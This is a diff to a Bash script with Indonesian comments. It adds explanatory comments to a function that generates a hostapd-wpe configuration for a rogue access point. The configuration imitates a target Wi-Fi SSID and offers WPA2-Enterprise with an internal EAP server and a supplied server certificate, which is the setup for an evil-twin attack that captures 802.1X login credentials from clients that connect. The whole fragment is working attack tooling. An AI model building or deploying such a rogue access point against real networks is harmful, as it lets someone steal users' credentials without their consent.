@@ -183,20 +183,47 @@ function bikin_file_konfigurasi(){
         echo "[*] Membuat file konfigurasi '${output_file}'..."
 
         cat << EOF > "${output_file}"
+# Interface Wi-Fi yang digunakan untuk membuat Rogue AP
 interface=${interface_rogue}
+#
+# Driver Wi-Fi yang digunakan (nl80211 untuk driver modern Linux)
 driver=nl80211
+#
+# Nama SSID (Wi-Fi) target yang akan ditiru
 ssid=${ssid}
+#
+# Mode wireless (g = 2.4 GHz/802.11g)
 hw_mode=g
+#
+# Channel Wi-Fi yang digunakan oleh Rogue AP
 channel=${channel}
+#
+# Mengaktifkan WPA2
 wpa=2
+#
+# Metode manajemen kunci menggunakan WPA-Enterprise (802.1X)
 wpa_key_mgmt=WPA-EAP
+#
+# Cipher yang digunakan untuk WPA (AES/CCMP)
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
+#
+# Mengaktifkan autentikasi IEEE 802.1X
 ieee8021x=1
+#
+# Mengaktifkan EAP server internal (hostapd-wpe)
 eap_server=1
+#
+# File daftar user EAP (digunakan untuk logging atau simulasi autentikasi)
 eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+#
+# Private key server yang digunakan untuk proses TLS
 private_key=${private_key}
+#
+# Sertifikat server (X.509) yang akan dikirim ke klien
 server_cert=${sertifikat_server}
+#
+# Parameter Diffie-Hellman untuk pertukaran kunci TLS
 dh_file=/etc/hostapd-wpe/certs/dh
 EOF
         echo "[+] Berhasil membuat file konfigurasi '${output_file}'."
